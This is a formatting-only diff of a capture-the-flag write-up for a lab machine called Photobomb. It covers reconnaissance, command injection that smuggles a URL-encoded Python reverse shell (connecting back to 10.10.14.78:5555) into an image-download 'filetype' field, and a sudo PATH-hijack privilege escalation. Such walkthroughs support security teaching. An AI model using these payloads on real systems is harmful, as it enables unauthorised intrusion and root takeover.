@@ -8,22 +8,22 @@ To begin with, our first priority is to conduct reconnaissance using the provide
 No alt text provided for this image
 Nmap Scan
 
-By analyzing the current status, we can observe that only two ports are accessible - port 22 and port 80. The latter, identified as an http port, appears to be running nginx 1.18.0 on Ubuntu. Our next course of action is to focus on port 80 and investigate any potential website content. Utilizing the given IP address of 10.129.228.60, we can explore the contents available on this specific port.
+By analyzing the current status, we can observe that only two ports are accessible - port 22 and port 80. The latter, identified as an http port, appears to be running nginx 1.18.0 on Ubuntu. Our next course of action is to focus on port 80 and investigate any potential website content. Utilizing the given IP address of `10.129.228.60`, we can explore the contents available on this specific port.
 
 No alt text provided for this image
 IP Showing URL Name
 
-At this point, we need to include the new URL "photobomb.htb" to the /etc/hosts file to access the corresponding webpage. From here we will nano into the /etc/hosts file.
+At this point, we need to include the new URL "photobomb.htb" to the `/etc/hosts` file to access the corresponding webpage. From here we will nano into the `/etc/hosts` file.
 
 No alt text provided for this image
 etc/hosts file
 
-With the updated IP and URL added to the /etc/hosts file, we can now revisit the browser and access the photobomb.htb link. This will allow us to delve deeper into the website and conduct further investigation.
+With the updated IP and URL added to the `/etc/hosts` file, we can now revisit the browser and access the photobomb.htb link. This will allow us to delve deeper into the website and conduct further investigation.
 
 No alt text provided for this image
 Webpage working properly
 
-On the page, we have a hyperlink "click here!" that leads to photobomb.htb/printer. Upon clicking on the link, a login popup appears. We attempted to log in with the credentials "admin:admin," but no response was generated. Cancelling the login led us to a 401 Authorization Required error, accompanied by nginx/1.18.0 (Ubuntu) message.
+On the page, we have a hyperlink "click here!" that leads to `photobomb.htb/printer`. Upon clicking on the link, a login popup appears. We attempted to log in with the credentials "admin:admin," but no response was generated. Cancelling the login led us to a 401 Authorization Required error, accompanied by nginx/1.18.0 (Ubuntu) message.
 
 No alt text provided for this image
 Login
@@ -60,7 +60,7 @@ To obtain a reverse shell, we utilized the Online Reverse Shell Generator (revsh
 export RHOST="10.10.14.78";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
 ```
 
-Our next step will involve URL encoding the reverse shell and embedding it into the &filetype=jpg& field in BurpSuite. Additionally, we must establish a Netcat listener. The method I used to URL encode the reverse shell is by utilizing the built-in function in BurpSuite.
+Our next step will involve URL encoding the reverse shell and embedding it into the `&filetype=jpg&` field in BurpSuite. Additionally, we must establish a Netcat listener. The method I used to URL encode the reverse shell is by utilizing the built-in function in BurpSuite.
 
 ```
 %3bexport%20RHOST%3D%2210.10.14.78%22%3Bexport%20RPORT%3D5555%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27
@@ -85,17 +85,17 @@ After traversing through the system directories, I successfully obtained the use
 No alt text provided for this image
 Sudo -l
 
-Using the command "sudo -l," we were able to determine the type of root privileges granted to the user. It appears that the user has root privileges to execute the command "/opt/clean.sh". To proceed, we will investigate the "/opt/clean.sh" file by running the "cat /opt/clean.sh" command. This will display the contents of the file in the terminal.
+Using the command `sudo -l`, we were able to determine the type of root privileges granted to the user. It appears that the user has root privileges to execute the command `/opt/clean.sh`. To proceed, we will investigate the `/opt/clean.sh` file by running the `cat /opt/clean.sh` command. This will display the contents of the file in the terminal.
 
 No alt text provided for this image
 cat /opt/cleanup.sh
 
-In the next step, we need to switch to the bash shell and then set the executable permission for the "find" file to gain complete access. We can accomplish this by running "chmod +x find". The command "echo bash > find" will create a file named "find" in the current directory and write the string "bash" to it. If the file already exists, it will be overwritten.
+In the next step, we need to switch to the bash shell and then set the executable permission for the `find` file to gain complete access. We can accomplish this by running `chmod +x find`. The command `echo bash > find` will create a file named `find` in the current directory and write the string `bash` to it. If the file already exists, it will be overwritten.
 
 No alt text provided for this image
 echo bash > find | chmod +x find
 
-The next command is sudo PATH=$PWD:$PATH /opt/cleanup.sh. This will add the current working directory to the beginning of the $PATH environment variable, giving priority to any executables in the current directory over those in other directories. Then, it runs the /opt/clean.sh script with sudo, which will execute with root privileges because of the sudo command.
+The next command is `sudo PATH=$PWD:$PATH /opt/cleanup.sh`. This will add the current working directory to the beginning of the $PATH environment variable, giving priority to any executables in the current directory over those in other directories. Then, it runs the `/opt/clean.sh` script with sudo, which will execute with root privileges because of the sudo command.
 
 No alt text provided for this image
 Root Access
